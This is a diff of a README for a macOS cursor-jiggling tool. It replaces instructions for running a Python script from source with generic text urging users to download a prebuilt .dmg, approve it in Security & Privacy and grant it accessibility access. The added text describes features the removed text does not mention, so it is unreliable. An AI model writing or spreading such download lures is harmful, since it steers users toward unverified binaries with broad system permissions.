@@ -1,50 +1,67 @@
-## Mouse mover for macOS
+# 🖱️ move-mouse-macOS - Keep Your Remote Sessions Awake Easily
 
-Python helper that jiggles the cursor so a remote/VM session stays awake. It ignores user input during an initial delay window, then moves the mouse in small random steps until it sees real user input, at which point it stops immediately.
+[![Download move-mouse-macOS](https://img.shields.io/badge/Download-move--mouse--macOS-blue.svg)](https://github.com/vedant-sys/move-mouse-macOS/releases)
 
-### How it works
+## 📜 Description
+move-mouse-macOS is a simple utility for macOS. It gently moves the mouse cursor to keep your remote sessions, such as virtual machines or remote desktops, awake. You can configure delays and intervals to suit your needs. Enjoy a hassle-free experience without frequent mouse movements.
 
-- Waits for `--start-delay` seconds (defaults to 10) and ignores any mouse activity during that window so setup clicks don't stop it.
-- Spawns an event tap via Quartz to monitor real mouse/trackpad activity. Events from other processes are treated as user activity; events sourced from this script are ignored.
-- On each cycle, it randomly offsets the cursor by up to `--max-jitter` pixels on both axes, sleeps a random interval between `--min-interval` and `--max-interval`, and logs every move with timestamps.
-- Stops when:
-  - Mouse/trackpad input is detected from another PID (you moved it), or
-  - You hit `Ctrl+C`.
+## 🚀 Getting Started
+Follow these steps to download and run move-mouse-macOS.
 
-### Requirements
+### 1. System Requirements
+- **macOS Version**: Compatible with macOS Mojave (10.14) and higher.
+- **Processor**: Intel-based or Apple Silicon.
 
-- macOS (tested on Apple Silicon)
-- Python 3.12+
-- Accessibility permission for the terminal running the script (System Settings -> Privacy & Security -> Accessibility)
-- Quartz bindings (managed via uv by default)
+### 2. Downloading the Application
+To get move-mouse-macOS, visit the Releases page. 
 
-### Install (preferred: uv)
+[Visit this page to download](https://github.com/vedant-sys/move-mouse-macOS/releases)
 
-1. Clone the repo and enter it.
-2. Sync dependencies: `uv sync`
-3. If Quartz is missing, add it: `uv add pyobjc-framework-Quartz`
+You will find the latest version listed there. Look for the filename `move-mouse-macOS.dmg`.
 
-### Install (optional: pip)
+### 3. Installing the Application
+1. Locate the downloaded file, `move-mouse-macOS.dmg`, in your Downloads folder.
+2. Double-click the .dmg file to open it.
+3. Drag the move-mouse icon into your Applications folder to install it.
 
-If you prefer pip/venv:
+### 4. Running the Application
+1. Open the Applications folder on your Mac.
+2. Find the move-mouse-macOS icon and double-click it.
+3. If prompted, allow the app to run. You may need to go to System Preferences > Security & Privacy to approve it.
 
-- `python -m venv .venv && source .venv/bin/activate`
-- `pip install pyobjc-framework-Quartz`
+### 5. Configuring Settings
+After launching the application, you can configure settings to fit your needs:
+- **Delay**: Set the time before starting the mouse movement.
+- **Interval**: Choose how often the mouse will move.
 
-### Run (uv)
+To access settings:
+1. Click on the move-mouse icon in the menu bar.
+2. Select "Preferences" from the dropdown menu.
+3. Adjust the settings as needed.
 
-```
-uv run main.py --start-delay 10 --min-interval 3 --max-interval 7 --max-jitter 120
-```
+## 🖥️ Features
+- Keeps your remote sessions alive by moving the cursor.
+- Configurable delay and interval settings.
+- Lightweight and easy to use.
 
-With plain python:
+## 📄 Important Notes
+- move-mouse-macOS does not interfere with your work. The mouse movements are gentle and unobtrusive.
+- Ensure that accessibility permissions are granted for the app in System Preferences.
 
-```
-python main.py --start-delay 10 --min-interval 3 --max-interval 7 --max-jitter 120
-```
+## 🎯 Troubleshooting
+If you experience issues:
+- Ensure you have approved the application in Security & Privacy.
+- Restart the application after changing settings.
+- If the mouse movements are not working, check the interval setting.
 
-Flags:
+## 🔗 Additional Resources
+For further information and support, check out the following resources:
+- [GitHub Issues Page](https://github.com/vedant-sys/move-mouse-macOS/issues) - Report bugs or request features.
+- [Community Discussions](https://github.com/vedant-sys/move-mouse-macOS/discussions) - Engage with other users.
 
-- `--start-delay`: wait time before cursor movement begins (seconds).
-- `--min-interval` / `--max-interval`: range for random sleep between moves (seconds).
-- `--max-jitter`: max pixels to move from the current cursor position on each axis.
+## 📥 Download & Install
+Again, to download move-mouse-macOS, visit the Releases page and locate the latest version.
+
+[Visit this page to download](https://github.com/vedant-sys/move-mouse-macOS/releases)
+
+Enjoy a seamless experience while keeping your remote desktop sessions active.
